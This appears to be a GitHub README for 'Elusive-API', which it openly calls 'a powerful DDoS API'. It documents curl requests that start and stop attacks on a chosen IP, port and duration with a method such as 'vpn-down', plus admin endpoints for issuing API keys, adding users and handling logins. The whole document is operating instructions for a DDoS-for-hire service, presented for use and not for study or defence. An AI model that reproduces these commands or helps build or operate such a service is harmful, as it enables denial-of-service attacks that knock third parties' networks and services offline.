
# Elusive-API

**If you are looking for the Wrapper please go [here](https://github.com/ElusiveSquad/Elusive-API-Wrapper)**
  
    
    
> **Elusive API is a powerful DDoS API**.  
> **Elusive sanitizes all requests, preventing RCE, SQLI , XSS and many more**.  

> Power proof is below.  
  
![power proof](https://user-images.githubusercontent.com/93349356/164955316-cc5024fa-ddaa-48f0-9373-88af43395b1e.jpg) 

# Starting attacks via API  

To start attacks use the /api/server endpoint. It takes in the following parameters (API_KEY,ip,port,time,method) in a GET request.

Example:
  ```bash
  curl -get www.example.com/api/server.php?API_KEY=test_api_key&ip=1.1.1.1&port=80&time=200&method=vpn-down
  ```
  if succeeded, you will get a 200 status response code, if you provide an invalid API key you will get a 403 response code. In the case the server errors you will get a 500 response status code.
  
# Stopping attacks via API 
To stop attacks use the /api/stop endpoint. It takes in 2 parameters "key" & "ip" where you provide your API Key & IP address to stop attacking in a GET request.  
  
Example:      
  
  ```bash
  curl -get www.example.com/api/stop.php?key=test_api_key&ip=1.1.1.1
  ```
  if succeeded, you will a json response "Success", if you provide an invalid API key you will get a json response "failure", and if you provide an invalid API key you will get the response "Invalid API key."  
 

 # Generating API Keys via API
 
 To add an API key, this is restricted to Administrators only, you will do this by using the endpoint /api/admin/add.php providing two parameters "key" & "action" in a POST request.  
    
**NOTE: The "key" parameter takes the ADMINISTRATOR key, not your send attack & stop attack api key.**
 
Example:       
  
  ``` bash  
   curl -X POST -d "key=test_key" -d "action=api-key" www.example.com/api/admin/add.php
  ```
    
  
 # Adding users via API 
 
  To add a user, this is restricted to Administrators only, you will do this by using the endpoint /api/admin/add.php providing three parameters "key", "action" & "uname" in a POST request.  
    
**NOTE: The "key" parameter takes the ADMINISTRATOR key, not your send attack & stop attack api key.**
  
Example:    

   
    curl -X POST -d "key=test_key" -d "action=usr-add" -d "uname=test_user" www.example.com/api/admin/add.php
     

# User Authentication  


  If you are making a tool with this API, you may want to consider a login system. the endpoint /api/login.php can provide this. It takes in 2 parameters "username" & "password" in a POST request. The APIs response code will return 200 if it had an existing account sent in the post request, if not it will return a 403 response code.  
  
  
Example:  

    curl -X POST -d "username=test_username" -d "password=test_password" www.example.com/api/login.php  
      
![xdd](https://user-images.githubusercontent.com/93349356/164956846-0fb4fb84-01d6-490c-b940-6b9c928583d4.jpg)

